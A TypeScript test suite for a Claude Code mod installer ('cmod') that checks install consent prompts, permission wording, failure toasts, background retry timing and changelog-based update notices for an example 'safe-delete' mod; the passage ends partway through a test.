import { expect, test } from 'bun:test'
import type { Args, ClassicHookInputs, EventResult, Frozen, FsEntry, HookStream, ProcessRunResult, ProcessSpawnChunk, ProcessSpawnRequest, ProcessSpawnResult, RenderElement } from 'claude-code'
import { installerPaneOf } from '../../src/runtime/installer.js'
import { defineStep } from '../../src/installer.js'
import { permissions } from '../../src/jobs/permissions.js'
import { slashCommand } from '../../src/jobs/slash-command.js'
import { defineMod, sessions, type CwdChange, type Mod } from '../../src/mod.js'
import { option } from '../../src/options.js'
import type { RoutedEvent } from '../../src/runtime/hooks.js'
import { createLifecycle, readPlugin, type Lifecycle, type Plugin } from '../../src/runtime/lifecycle.js'
import { permissionRoutes } from '../../src/runtime/permission-check.js'
import { scriptsSha256 } from '../../src/records.js'
import type { ShownToast } from '../../src/testing.js'
import { calledAnswer, fakeClaude } from '../../src/testing/fake-claude.js'
import { findElement, rowsOf, textOf } from '../../src/testing/fake-elements.js'
import { fakeFiles } from '../../src/testing/fake-files.js'
import { Text } from '../../src/ui/elements.js'

const root = '/plugins/safe-delete'
const pending: Plugin = { name: 'safe-delete', root, version: '0.2.0', store: '/home/.local/share/cmod', isInstalled: false, shouldRecord: false, steps: {}, granted: [] }

const given = (plugin: Plugin) => async () => plugin

const cmodMissing = async (): Promise<ProcessRunResult> => Promise.reject(new Error('failed to start: ENOENT: spawn cmod ENOENT'))

const manifestOnly = { [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }' }

const entriesIn = (files: Record<string, string>) => async (folder = ''): Promise<FsEntry[]> => {
  const prefix = `${folder.replaceAll('/./', '/')}/`
  const names = new Set(Object.keys(files).flatMap((path) => (path.startsWith(prefix) ? [path.slice(prefix.length).split('/')[0] as string] : [])))
  return [...names].map((name) => ({ name, kind: files[`${prefix}${name}`] === undefined ? 'dir' : 'file', size: 1, mtimeMs: 0, isLink: false }))
}

function controlledStream() {
  const queue: (ProcessSpawnChunk | ProcessSpawnResult)[] = []
  let wake: (() => void) | undefined
  const push = (item: ProcessSpawnChunk | ProcessSpawnResult) => {
    queue.push(item)
    wake?.()
  }
  async function* read(): AsyncGenerator<ProcessSpawnChunk, ProcessSpawnResult> {
    for (;;) {
      while (queue.length === 0) await new Promise<void>((resolve) => (wake = resolve))
      const item = queue.shift() as ProcessSpawnChunk | ProcessSpawnResult
      if ('code' in item) return item
      yield item
    }
  }
  const stream = Object.assign(read(), { result: new Promise<ProcessSpawnResult>(() => undefined) }) as HookStream<ProcessSpawnChunk, ProcessSpawnResult>
  return {
    stream,
    print: (text: string) => push({ stream: 'stdout', text: `${text}\n` }),
    printError: (text: string) => push({ stream: 'stderr', text: `${text}\n` }),
    exit: (code: number) => push({ code, signal: null }),
  }
}

function finished(lines: readonly string[], code: number) {
  const controlled = controlledStream()
  for (const text of lines) controlled.print(text)
  controlled.exit(code)
  return controlled.stream
}

const cmodOnPath = async (): Promise<ProcessRunResult> => ({ exitCode: 0, stdout: 'cmod 0.1.0\n', stderr: '', isStdoutTruncated: false, isStderrTruncated: false })

const postToolUse: ClassicHookInputs['PostToolUse'] = {
  session_id: 's',
  transcript_path: '/t',
  cwd: '/work',
  hook_event_name: 'PostToolUse',
  tool_name: 'Read',
  tool_input: {},
  tool_response: {},
  tool_use_id: 'toolu_1',
}

const promptSubmit = { ...postToolUse, hook_event_name: 'UserPromptSubmit', prompt: 'hi' }

const toolBatch = { session_id: 's', cwd: '/work', hook_event_name: 'PostToolBatch', tool_calls: [] }

function failed(message: string, description?: string): ShownToast[] {
  return [{ type: 'error', message, ...(description === undefined ? {} : { description }) }]
}

function fire<N extends RoutedEvent>(lifecycle: Pick<Lifecycle<object>, 'route'>, event: N, input: unknown, below: unknown) {
  return lifecycle.route(event, input as Frozen<Args<N>>, async () => below as EventResult<N>)
}

function trackedMod() {
  const runs: string[] = []
  const definition = defineMod({
    name: 'safe-delete',
    setup(mod) {
      runs.push('setup')
      sessions.current.beforeToolBatch(() => {
        runs.push('PostToolBatch')
        return { note: 'safe-delete saw it' }
      })
      void mod.ui.pane({ id: 'trash', title: 'Trash', render: () => Text({ children: 'empty' }) })
    },
  })
  return { runs, definition }
}

const abovePrompt = { surface: 'terminal', component: 'AbovePrompt', requestId: 'band', props: {}, viewport: { columns: 100, rows: 30 } }
const prompt = { type: 'Text', children: ['>'] } as unknown as RenderElement
const installerPaneFor = (name = 'safe-delete') => ({ surface: 'terminal', component: 'Pane', requestId: installerPaneOf(name), props: { title: 'Install', isFocused: true, bodyColumns: 80, placement: 'dock' } })

async function installerText(lifecycle: Pick<Lifecycle<object>, 'route'>, name?: string): Promise<string> {
  return textOf(await fire(lifecycle, 'ui.render', installerPaneFor(name), prompt))
}

async function pressInInstaller(lifecycle: Pick<Lifecycle<object>, 'route'>, key: string, name?: string): Promise<void> {
  const button = findElement(await fire(lifecycle, 'ui.render', installerPaneFor(name), prompt), 'Button', key)
  if (button === undefined) throw new Error(`The installer draws no button ${key}.`)
  await (button['onPress'] as () => unknown)()
}

test('a mod with a pending install registers nothing until done, then runs setup on the next event', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const step = controlledStream()
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return step.stream
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given({ ...pending, granted: ['prompt'] }))
  step.print('progress 1 4 Checking Homebrew')
  step.print('log Homebrew 4.6.0')
  step.print('progress 2 4 Installing trash')
  await fake.settle()

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})).toEqual({})
  expect(runs).toEqual([])
  expect(rowsOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 100).map((row) => row.trimEnd())).toEqual([
    '>',
    '⠋  safe-delete  Installing                                  ✕',
    `                ${'█'.repeat(12)}${'░'.repeat(12)}  Installing trash`,
  ])

  step.print('progress 4 4 Adding the zsh alias')
  step.print('done safe-delete 0.2.0')
  step.exit(0)
  await fake.settle()

  expect(runs).toEqual([])

  const answer = await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(runs).toEqual(['setup', 'PostToolBatch'])
  expect(answer).toEqual({ additionalContext: ['<safe-delete_mod>\nsafe-delete saw it\n</safe-delete_mod>'] })
  await fake.settle()
  expect(lifecycle.toasts).toEqual([{ type: 'success', message: 'Installed', description: 'Adds the Trash pane.\nAdd text Claude reads and start turns.' }])
  expect(fake.shown.logs).toEqual([])
  expect(textOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt))).toStartWith('>\n✓  safe-delete  Installed')
})

test('a call to a mod still installing fails with when to retry', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => controlledStream().stream
  const lifecycle = createLifecycle(trackedMod().definition)
  const below = { value: [{ name: 'parse', line: 1 }] }

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(await fire(lifecycle, 'cmod.call', { to: 'safe-delete', method: 'restore', input: { path: 'a.ts' } }, { deny: 'safe-delete is not installed. Add it with /plugin.' })).toEqual({
    deny: "safe-delete is installing. Try again when it's ready.",
  })
  expect(await fire(lifecycle, 'cmod.call', { to: 'tracer', method: 'signatures', input: { path: 'a.ts' } }, below)).toBe(below)
})

test('a call to a mod that is still starting waits for it, then answers', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const lifecycle = createLifecycle(defineMod({ name: 'safe-delete', api: { restore: () => ['a.ts'] }, setup() {} }))
  const plugins: ((plugin: Plugin) => void)[] = []
  const starting = lifecycle.start(fake.claude, () => new Promise<Plugin>((resolve) => void plugins.push(resolve)))

  const answer = fire(lifecycle, 'cmod.call', { to: 'safe-delete', method: 'restore', input: null }, { deny: 'safe-delete is not installed. Add it with /plugin.' })
  await fake.settle()
  plugins.shift()?.({ ...pending, isInstalled: true })
  await starting

  expect(await answer).toEqual({ value: ['a.ts'] })
})

test("a call that comes before the mod's session.start waits for the start, then answers", async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const lifecycle = createLifecycle(defineMod({ name: 'safe-delete', api: { restore: () => ['a.ts'] }, setup() {} }))

  const answer = fire(lifecycle, 'cmod.call', { to: 'safe-delete', method: 'restore', input: null }, { deny: 'safe-delete is not installed. Add it with /plugin.' })
  await lifecycle.start(fake.claude, given({ ...pending, isInstalled: true }))

  expect(await answer).toEqual({ value: ['a.ts'] })
})

test('a call to a mod whose install was declined fails and points at its toast', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t'], 10)
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  await pressInInstaller(lifecycle, 'not-now')
  await fake.settle()

  expect(await fire(lifecycle, 'cmod.call', { to: 'safe-delete', method: 'restore', input: { path: 'a.ts' } }, { value: [] })).toEqual({
    deny: 'safe-delete is not set up. Its toast says why.',
  })
})

test('while the installer waits for the answer, its toast stays still, so no redraw takes a press away', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t'], 10)
  const spinners: { isRunning: boolean }[] = []
  fake.fakes.clock.every = () => {
    const spinner = { isRunning: true }
    spinners.push(spinner)
    return { cancel: () => void (spinner.isRunning = false) }
  }
  const lifecycle = createLifecycle(trackedMod().definition)

  void lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(lifecycle.toasts).toEqual([{ type: 'info', message: 'Installing', description: 'Waiting for your answer' }])
  expect(spinners.filter((spinner) => spinner.isRunning)).toEqual([])
})

test('needs-consent opens the installer focused, and Accept runs the setup again with the hash', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return spawned.length === 1 ? finished(['needs-consent abc123\t./setup/install.sh\t./setup/uninstall.sh\tshift+tab to /mode'], 10) : finished(['done safe-delete 0.2.0'], 0)
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(fake.calls.find((call) => call.call === 'ui.open')?.args).toEqual([{ id: 'installer-safe-delete', title: 'Install safe-delete', focus: true, holdToasts: true, closeOnEscape: true }])
  expect(await installerText(lifecycle)).toContain('safe-delete wants to:')
  expect(await installerText(lifecycle)).toContain('Run ./setup/install.sh now, and ./setup/uninstall.sh when you remove it')
  expect(await installerText(lifecycle)).toContain('Bind shift+tab to /mode')
  await pressInInstaller(lifecycle, 'accept')
  await fake.settle()
  expect(spawned.map((request) => request.argv)).toEqual([
    ['cmod', 'setup', root, '--events'],
    ['cmod', 'setup', root, '--events', '--consent', 'abc123'],
  ])
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})
  expect(runs).toEqual(['setup', 'PostToolBatch'])
})

test('a mod that only binds keys asks about the keys alone', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t\t\tshift+tab to /mode and alt+m to /mode'], 10)
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  const shown = await installerText(lifecycle)
  expect(shown).toContain('Change your computer:')
  expect(shown).toContain('Bind shift+tab to /mode and alt+m to /mode')
  expect(shown).not.toContain('Run ')
})

test('a mod installed from a marketplace with no update choice says it will update automatically, and one the person chose for says nothing', async () => {
  const cached = '/test/home/.claude/plugins/cache/safe-market/safe-delete/0.2.0'
  const shownFor = async (autoUpdate: boolean | undefined) => {
    const fake = fakeClaude({ name: 'safe-delete', root: cached })
    fake.fakes.process.run = cmodOnPath
    fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t'], 10)
    fake.fakes.settings.read = async () => ({ extraKnownMarketplaces: { 'safe-market': { source: { source: 'github', repo: 'owner/safe' }, ...(autoUpdate === undefined ? {} : { autoUpdate }) } } })
    const lifecycle = createLifecycle(trackedMod().definition)
    await lifecycle.start(fake.claude, given({ ...pending, root: cached }))
    await fake.settle()
    return installerText(lifecycle)
  }

  expect(await shownFor(undefined)).toContain('Update safe-delete automatically from the safe-market marketplace')
  expect(await shownFor(false)).not.toContain('automatically')
})

test('a mod that asks for permissions names each one in the words the person reads', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t\t\tnetwork:api.github.com\tprompt'], 10)
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  const shown = await installerText(lifecycle)
  expect(shown).toContain('Connect to api.github.com')
  expect(shown).toContain('Add text Claude reads and start turns')
  expect(shown).toContain('and change your computer:')
})

test('a key bound to a command that waits for the turn warns with the fix, and an immediate command warns nothing', async () => {
  const fake = fakeClaude({ name: 'modes', root })
  const definition = defineMod({
    name: 'modes',
    setup(mod) {
      mod.use(slashCommand({ name: 'mode', description: 'Switch mode', reply: () => undefined }))
      mod.use(slashCommand({ name: 'review', description: 'Review mode', immediate: true, reply: () => undefined }))
    },
  })

  const lifecycle = createLifecycle(definition)
  await lifecycle.start(fake.claude, given({ ...pending, isInstalled: true, steps: { keys: { 'shift+tab': 'mode', 'alt+r': 'review' } } }))
  await fake.settle()

  expect(fake.shown.commands).toEqual(['mode', 'review'])
  expect(lifecycle.toasts.filter(({ type }) => type === 'warning')).toEqual([
    { type: 'warning', message: "shift+tab runs /mode, which waits for Claude's turn to end", description: 'It adds a row to the conversation. Give /mode immediate: true.' },
  ])
})

test('Not now declines the install with one notice naming cmod install, and setup never runs', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t'], 10)
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  await pressInInstaller(lifecycle, 'not-now')
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(lifecycle.toasts).toEqual([{ type: 'default', message: 'Not installed', description: 'Install it whenever you like.' }])
  expect(runs).toEqual([])
})

test('a failed install draws the sentence cmod setup wrote and its fix, and setup never runs', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['progress 1 4 Checking Homebrew', 'failed 1\tThe install step of safe-delete exited 1: brew: command not found.'], 1)
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(runs).toEqual([])
  expect(lifecycle.toasts).toEqual([
    { type: 'error', message: 'The install step of safe-delete exited 1: brew: command not found.' },
  ])
})

test('Retry on a failed install runs cmod setup again, and a done setup activates the mod', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const outcomes = [['failed 1\tdisk full'], ['done safe-delete 0.2.0']]
  fake.fakes.process.spawn = () => finished(outcomes.shift() ?? [], 0)
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)
  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  const retry = findElement(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 'Button', 'Retry')
  if (retry === undefined) throw new Error('The failed install draws no Retry button.')

  await (retry['onPress'] as () => void)()
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(lifecycle.failure).toBeUndefined()
  expect(lifecycle.phase).toBe('active')
  expect(runs).toEqual(['setup', 'PostToolBatch'])
})

test('Retry keeps the failure toast in place, with its progress where its buttons were, until the try ends', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const second = controlledStream()
  const streams = [finished(['failed 1\tdisk full'], 1), second.stream]
  fake.fakes.process.spawn = () => streams.shift() ?? finished([], 0)
  const lifecycle = createLifecycle(trackedMod().definition)
  const rows = async () => rowsOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 100).map((row) => row.trimEnd())
  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  const failed = await rows()
  const retry = findElement(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 'Button', 'Retry')
  if (retry === undefined) throw new Error('The failed install draws no Retry button.')

  void (retry['onPress'] as () => unknown)()
  await fake.settle()
  second.print('progress 1 4 Building trace')
  await fake.settle()
  const trying = await rows()
  second.print('failed 1\tdisk full')
  second.exit(1)
  await fake.settle()

  expect(trying.length).toBe(failed.length)
  expect(trying[1]?.slice(1)).toBe(failed[1]?.slice(1))
  expect(trying.at(-1)).toMatch(/Trying again: .* Building trace/)
  expect(await rows()).toEqual(failed)
})

test('Retry on a failure with a description shows its progress in the description, and keeps its buttons', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.clock.after = () => ({ cancel: () => undefined })
  const second = controlledStream()
  const streams = [finished(['failed 1\tdisk full', 'retries later'], 1), second.stream]
  fake.fakes.process.spawn = () => streams.shift() ?? finished([], 0)
  const lifecycle = createLifecycle(trackedMod().definition)
  const rows = async () => rowsOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 100).map((row) => row.trimEnd())
  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  const failed = await rows()
  const retry = findElement(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 'Button', 'Retry')
  if (retry === undefined) throw new Error('The failed install draws no Retry button.')

  void (retry['onPress'] as () => unknown)()
  await fake.settle()
  const trying = await rows()
  second.exit(0)
  await fake.settle()

  expect(failed.slice(2)).toEqual(['                Trying again in 2 s.', '                Retry  Report  Hide'])
  expect(trying.slice(2)).toEqual(['                Trying again: Installing', '                Retry  Report  Hide'])
  expect(trying[1]?.slice(1)).toBe(failed[1]?.slice(1))
})

const changelog = `# Changelog

## [Unreleased]

## [0.2.0] - 2026-10-13

### Added
- /rollback undoes the last deploy.

### Changed
- Deploys wait for CI.
- The status line names the branch.

### Removed
- /deploy-old.

## [0.1.0] - 2026-09-30

- First release.
`

async function updatedFrom(previous: unknown, files: Record<string, string>, pluginRoot = root) {
  const fake = fakeClaude({ name: 'safe-delete', root: pluginRoot })
  const disk = fakeFiles(files)
  fake.fakes.fs.read = disk.read
  fake.store.set('cmod:announced', previous)
  const opened: unknown[] = []
  fake.fakes.cmod.call = async (call) => void opened.push(call)
  const lifecycle = createLifecycle(trackedMod().definition)
  await lifecycle.start(fake.claude, given({ ...pending, root: pluginRoot, isInstalled: true }))
  await fake.settle()
  return { fake, lifecycle, opened }
}

test("an update shows the new version's changelog, where it came from, and a Changelog button that opens it in /mods", async () => {
  const { lifecycle, opened } = await updatedFrom({ version: '0.1.0', added: [] }, { [`${root}/CHANGELOG.md`]: changelog })

  expect(lifecycle.toasts).toEqual([
    {
      type: 'success',
      message: 'Updated to 0.2.0',
      description: 'Added: /rollback undoes the last deploy.\nChanged: Deploys wait for CI.\nChanged: The status line names the branch.\n…\nFrom 0.1.0, loaded from /plugins/safe-delete.',
    },
  ])
  const button = findElement(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 'Button', 'Changelog')
  if (button === undefined) throw new Error('The Updated toast draws no Changelog button.')
  await (button['onPress'] as () => Promise<void>)()
  expect(opened).toEqual([{ to: 'cmod', method: 'openSettings', input: { mod: 'safe-delete', page: 'changelog' } }])
})

test('an update with no changelog says what the mod adds now, links its release, and has no Changelog button', async () => {
  const installed = '/home/.claude/plugins/cache/market/safe-delete/0.2.0'
  const manifest = JSON.stringify({ name: 'safe-delete', version: '0.2.0', repository: 'https://github.com/owner/safe-delete' })
  const { lifecycle } = await updatedFrom({ version: '0.1.0', added: ['the Trash pane', 'the Bin pane'] }, { [`${installed}/.claude-plugin/plugin.json`]: manifest }, installed)

  expect(lifecycle.toasts).toEqual([
    {
      type: 'success',
      message: 'Updated to 0.2.0',
      description: 'No longer adds the Bin pane.\nFrom 0.1.0.\nRelease notes: https://github.com/owner/safe-delete/releases/tag/v0.2.0',
    },
  ])
  expect(findElement(await fire(lifecycle, 'ui.render', abovePrompt, prompt), 'Button', 'Changelog')).toBeUndefined()
})

test('a version this machine already announced shows no toast', async () => {
  const { lifecycle } = await updatedFrom({ version: '0.2.0', added: [] }, { [`${root}/CHANGELOG.md`]: changelog })

  expect(lifecycle.toasts).toEqual([])
})

const recordFile = '/home/.local/share/cmod/records/safe-delete.json'

function stoppedSession(firstOutcome: string, code: number) {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const disk = fakeFiles({})
  fake.fakes.fs.stat = disk.stat
  fake.fakes.fs.read = disk.read
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished([firstOutcome], code)
  const { runs, definition } = trackedMod()
  return { fake, disk, runs, lifecycle: createLifecycle(definition) }
}

const installedNow = (installed: { isInstalled: boolean }) => async () => ({ ...pending, isInstalled: installed.isInstalled })

test('two sessions whose install failed start on their next prompt once cmod install writes the record, with no reload', async () => {
  const installed = { isInstalled: false }
  const sessions = [stoppedSession('failed 1\tdisk full', 1), stoppedSession('failed 1\tdisk full', 1)]
  for (const { fake, lifecycle } of sessions) {
    await lifecycle.start(fake.claude, installedNow(installed))
    await fake.settle()
  }
  expect(sessions.map(({ lifecycle }) => lifecycle.phase)).toEqual(['failed', 'failed'])

  installed.isInstalled = true
  for (const { disk } of sessions) await disk.write(recordFile, '{}')
  for (const { lifecycle } of sessions) await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  for (const { lifecycle } of sessions) await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(sessions.map(({ lifecycle }) => lifecycle.phase)).toEqual(['active', 'active'])
  expect(sessions.map(({ lifecycle }) => lifecycle.failure)).toEqual([undefined, undefined])
  expect(sessions.map(({ runs }) => runs)).toEqual([
    ['setup', 'PostToolBatch'],
    ['setup', 'PostToolBatch'],
  ])
})

test('a mod whose install was declined starts on the next prompt once cmod install writes the record', async () => {
  const installed = { isInstalled: false }
  const { fake, disk, runs, lifecycle } = stoppedSession('needs-consent abc123\t./setup/install.sh\t', 10)
  await lifecycle.start(fake.claude, installedNow(installed))
  await fake.settle()
  await pressInInstaller(lifecycle, 'not-now')
  await fake.settle()
  expect(lifecycle.phase).toBe('declined')

  installed.isInstalled = true
  await disk.write(recordFile, '{}')
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(lifecycle.phase).toBe('active')
  expect(runs).toEqual(['setup'])
})

test('a mod whose first start failed after its install starts again once cmod install rewrites its record', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const disk = fakeFiles({})
  fake.fakes.fs.stat = disk.stat
  fake.fakes.fs.read = disk.read
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['done safe-delete 0.2.0'], 0)
  let setups = 0
  const lifecycle = createLifecycle(
    defineMod({
      name: 'safe-delete',
      setup() {
        setups += 1
        if (setups === 1) throw new Error('the first setup fails')
      },
    }),
  )
  const installed = { isInstalled: false }
  await lifecycle.start(fake.claude, installedNow(installed))
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})
  await fake.settle()
  expect(lifecycle.phase).toBe('failed')

  installed.isInstalled = true
  await disk.write(recordFile, '{}')
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fake.settle()

  expect(lifecycle.phase).toBe('active')
  expect(setups).toBe(2)
})

test('a stopped mod whose record is unchanged stays stopped across prompts and shows its error once', async () => {
  const installed = { isInstalled: false }
  const { fake, runs, lifecycle } = stoppedSession('failed 1\tdisk full', 1)
  await lifecycle.start(fake.claude, installedNow(installed))
  await fake.settle()

  installed.isInstalled = true
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(lifecycle.phase).toBe('failed')
  expect(runs).toEqual([])
  expect(lifecycle.toasts).toEqual([{ type: 'error', message: 'disk full' }])
})

test('an install error longer than the band wraps its message across the band, with its buttons on a line under it', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const error = 'cmod bootstrap: cmod is installed at /home/me/.local/bin/cmod, but PATH finds no cmod. Put /home/me/.local/bin first on PATH, then restart Claude Code.'
  fake.fakes.process.spawn = () => finished([`failed 1\t${error}`], 1)
  const lifecycle = createLifecycle(trackedMod().definition)
  const narrowBand = { ...abovePrompt, viewport: { columns: 40, rows: 30 } }

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(rowsOf(await fire(lifecycle, 'ui.render', narrowBand, prompt), 40).map((row) => row.trimEnd())).toEqual([
    '>',
    '✗  safe-delete  cmod bootstrap: cmod is',
    '                installed at',
    '                /home/me/.local/bin/cmod',
    '                , but PATH finds no',
    '                cmod. Put',
    '                /home/me/.local/bin',
    '                first on PATH, then',
    '                restart Claude Code.',
    '                Retry  Report  Hide',
  ])
})

function retryingFake(setups: readonly (readonly string[])[], checkouts: readonly string[] = []) {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const setupsRun: string[][] = []
  let checkout = 0
  fake.fakes.process.spawn = (request) => {
    if (request.argv[0] === 'sh') return finished([checkouts[Math.min(checkout++, checkouts.length - 1)] ?? ''], 0)
    setupsRun.push([...request.argv])
    const lines = setups[Math.min(setupsRun.length - 1, setups.length - 1)] ?? []
    return finished(lines, lines.some((line) => line.startsWith('done')) ? 0 : 1)
  }
  const timers: { ms: number; fire: () => void; isCancelled: boolean }[] = []
  fake.fakes.clock.after = (ms, fire) => {
    const made = { ms, fire, isCancelled: false }
    timers.push(made)
    return { cancel: () => void (made.isCancelled = true) }
  }
  const fire = async (ms: number) => {
    const made = timers.find((each) => each.ms === ms && !each.isCancelled)
    if (made === undefined) throw new Error(`No timer of ${ms} ms is waiting.`)
    made.isCancelled = true
    made.fire()
    await fake.settle()
  }
  return { fake, setupsRun, timers, fire }
}

const notYet = 'failed 1\tThe v0.2.0 release of safe-delete has no SHA256SUMS yet. Its author attaches it with cmod publish.'

test('a release download that is not there yet shows the failure at once, retries in the background, and clears the failure when it works', async () => {
  const { fake, setupsRun, fire } = retryingFake([[notYet, 'retries later'], [notYet, 'retries later'], ['done safe-delete 0.2.0']])
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  const first = lifecycle.toasts
  await fire(2000)
  const second = lifecycle.toasts
  await fire(4000)

  expect(first).toEqual(failed('The v0.2.0 release of safe-delete has no SHA256SUMS yet. Its author attaches it with cmod publish.', 'Trying again in 2 s.'))
  expect(second).toEqual(failed('The v0.2.0 release of safe-delete has no SHA256SUMS yet. Its author attaches it with cmod publish.', 'Trying again in 4 s.'))
  expect(setupsRun).toHaveLength(3)
  expect(lifecycle.toasts.filter((toast) => toast.type === 'error')).toEqual([])
})

test('the background retry waits 2 s up to 128 s, then every 128 s', async () => {
  const { fake, timers, fire } = retryingFake([[notYet, 'retries later']])
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  for (const ms of [2000, 4000, 8000, 16_000, 32_000, 64_000, 128_000, 128_000]) await fire(ms)

  expect(timers.map((made) => made.ms)).toEqual([2000, 4000, 8000, 16_000, 32_000, 64_000, 128_000, 128_000, 128_000])
})

test('a failure that waiting cannot fix, such as a failed install step of a release, waits for Retry', async () => {
  const { fake, timers } = retryingFake([['failed 1\tThe install step of safe-delete exited 1.']])
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(lifecycle.toasts).toEqual(failed('The install step of safe-delete exited 1.'))
  expect(timers).toEqual([])
})

test('a retry after the person accepted carries that consent, so it never asks again, and the consent pane closes on Accept', async () => {
  const broken = 'failed 1\tThe install step of safe-delete exited 1.'
  const { fake, setupsRun, fire } = retryingFake([['needs-consent abc123\t./setup/install.sh\t'], [broken, 'retries changed'], ['done safe-delete 0.2.0']], ['abc', 'abc\n?? fixed'])
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  await pressInInstaller(lifecycle, 'accept')
  await fake.settle()
  await fire(2000)

  expect(setupsRun.map((argv) => argv.slice(-2))).toEqual([[pending.root, '--events'], ['--consent', 'abc123'], ['--consent', 'abc123']])
  expect(fake.calls.filter((call) => call.call === 'ui.close').map((call) => call.args[0])).toEqual([{ id: 'installer-safe-delete' }])
  expect(lifecycle.toasts.filter((toast) => toast.type === 'error')).toEqual([])
})

test("a linked checkout's failed build runs again only once the checkout changed", async () => {
  const broken = 'failed 1\tBuilding trace with "cargo xtask dist" exited 101.'
  const { fake, setupsRun, fire } = retryingFake([[broken, 'retries changed'], ['done safe-delete 0.2.0']], ['abc\n M src/main.rs', 'abc\n M src/main.rs', 'abc\n M src/main.rs\n+fixed'])
